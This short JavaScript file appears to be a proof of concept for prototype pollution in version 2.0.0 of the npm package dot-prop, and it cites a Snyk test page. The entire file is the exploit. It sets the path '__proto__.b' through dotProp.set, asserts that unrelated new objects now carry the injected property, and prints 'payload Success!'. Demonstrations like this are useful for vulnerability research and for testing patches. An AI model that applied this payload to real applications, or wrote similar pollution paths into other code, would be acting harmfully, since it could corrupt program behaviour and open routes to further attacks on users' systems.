//https://snyk.io/test/npm/dot-prop/2.0.0
var dotProp = require("dot-prop")
const assert = require('assert');

const object = {};
console.log("Before " + object.b); //Undefined
dotProp.set(object, '__proto__.b', "yes");


console.log("After " + {}.b); //true
assert({}.b === "yes");
console.log("payload Success!")
